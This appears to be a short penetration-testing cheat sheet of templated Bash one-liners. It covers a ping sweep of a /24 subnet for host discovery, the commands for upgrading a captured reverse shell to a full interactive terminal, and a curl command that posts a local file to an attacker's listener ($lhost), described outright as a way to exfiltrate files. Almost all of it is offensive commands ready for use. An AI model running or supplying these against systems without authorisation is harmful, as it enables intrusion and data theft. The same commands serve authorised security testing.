# Bash

## Bash oneliner

### Ping sweep

Run ping sweep with Bash.

Sweep a /24 with one ping each in parallel and print only successful replies. Quick host discovery without nmap, useful when scanning is restricted.

```sh title:"Bash Run Ping Sweep"
for i in {1..254} ;do (ping -c 1 $first_three_octets.$i | grep "bytes from" &) ;done
```
<!-- cheat
var first_three_octets = printf '%s\n' '192.168.1' '10.10.10' '172.16.0' --- --header 'First three octets'
-->

### Stabilize shell

Start stabilize shell with Bash.

Upgrade a dumb reverse shell to a full PTY using script(1), then background and fix terminal modes so tab completion, ctrl-c, and resizing work.

```sh title:"Bash Start Stabilize Shell"
/usr/bin/script -qc /bin/bash /dev/null
\# ^Z
\# stty raw -echo; fg; reset
```
<!-- cheat -->

### Curl file upload

Upload curl file upload with Bash.

POST a local file to a listener with multipart/form-data. Pair with a simple HTTP receiver to exfil one file at a time.

```sh title:"Bash Upload Curl File Upload"
curl -F 'file=@$file_to_upload' $lhost
```
<!-- cheat
var file_to_upload
var lhost
-->

